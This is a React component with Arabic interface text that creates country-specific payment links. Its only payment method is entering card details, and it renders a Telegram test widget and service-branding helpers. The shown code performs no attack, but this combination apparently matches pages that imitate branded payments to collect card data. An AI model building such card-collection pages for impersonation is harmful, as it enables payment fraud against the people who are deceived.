import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import { getCurrency, getDefaultTitle } from "@/utils/countryData";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { CreditCard, DollarSign, Hash, Building2, Copy, ExternalLink, FileText } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import TelegramTest from "@/components/TelegramTest";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreatePaymentLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");

  const [paymentAmount, setPaymentAmount] = useState("500");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!paymentAmount || parseFloat(paymentAmount) <= 0) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال مبلغ صحيح",
        variant: "destructive",
      });
      return;
    }

    try {
      const link = await createLink.mutateAsync({
        type: "payment",
        country_code: country || "",
        payload: {
          payment_amount: parseFloat(paymentAmount) || 500,
          currency_code: getCurrencyCode(country || "SA"),
          payment_method: paymentMethod,
          selectedCountry: country || "SA",
        },
      });

      // Generate unified payment URL using the new function
      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: "payment",
        country: country || 'SA'
      });

      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);

      toast({
        title: "تم إنشاء رابط السداد بنجاح!",
        description: "يمكنك الآن مشاركة الرابط مع العميل",
      });
    } catch (error) {
      console.error("Error creating payment link:", error);
      toast({
        title: "خطأ في إنشاء الرابط",
        description: "حدث خطأ أثناء إنشاء رابط السداد",
        variant: "destructive",
      });
    }
  };


  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <CreditCard className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        {/* Telegram Test Component */}
        <div className="mb-6">
          <TelegramTest />
        </div>

        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-elevated">
            <div
              className="h-16 -m-4 mb-4 rounded-t-xl relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
              <div className="absolute bottom-2 right-4 text-white">
                <h1 className="text-lg font-bold">إنشاء رابط سداد</h1>
                <p className="text-xs opacity-90">{countryData.nameAr}</p>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">

              {/* Payment Amount */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <DollarSign className="w-3 h-3" />
                  مبلغ السداد
                  {country && (
                    <span className="text-xs text-muted-foreground">
                      ({getCurrencyName(country)})
                    </span>
                  )}
                </Label>
                <Input
                  type="number"
                  value={paymentAmount}
                  onChange={(e) => setPaymentAmount(e.target.value)}
                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                  className="h-9 text-sm"
                  step="0.01"
                  min="0"
                />
                {country && (
                  <p className="text-xs text-muted-foreground mt-1">
                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
                  </p>
                )}
              </div>

              {/* Payment Method Selection */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <CreditCard className="w-3 h-3" />
                  طريقة الدفع *
                </Label>
                <Select value={paymentMethod} onValueChange={setPaymentMethod}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر طريقة الدفع" />
                  </SelectTrigger>
                  <SelectContent className="bg-background">
                    <SelectItem value="card">
                      <div className="flex items-center gap-2">
                        <CreditCard className="w-4 h-4" />
                        <span>بيانات البطاقة</span>
                      </div>
                    </SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <Button
                type="submit"
                size="lg"
                className="w-full h-11 text-white mt-6"
                style={{
                  background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`
                }}
                disabled={createLink.isPending}
              >
                {createLink.isPending ? "جاري الإنشاء..." : "إنشاء رابط السداد"}
              </Button>
            </form>
          </Card>
        </div>

        {/* Success Dialog */}
        <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
          <AlertDialogContent className="sm:max-w-md" dir="rtl">
            <AlertDialogHeader>
              <AlertDialogTitle className="text-right">✅ تم إنشاء رابط السداد بنجاح!</AlertDialogTitle>
              <AlertDialogDescription className="text-right">
                يمكنك الآن مشاركة هذا الرابط مع العميل لدفع المبلغ المطلوب
              </AlertDialogDescription>
            </AlertDialogHeader>
            <AlertDialogFooter className="flex flex-row gap-2 justify-start">
              <Button
                variant="outline"
                onClick={() => window.open(createdPaymentUrl, '_blank')}
                className="flex-1"
              >
                <ExternalLink className="w-4 h-4 ml-2" />
                معاينة الرابط
              </Button>
              <AlertDialogAction
                onClick={() => {
                  navigate(`/pay/${linkId}/data`);
                }}
                className="flex-1"
              >
                إدخال بيانات السداد
              </AlertDialogAction>
            </AlertDialogFooter>
          </AlertDialogContent>
        </AlertDialog>
      </div>
    </div>
  );
};

export default CreatePaymentLink;
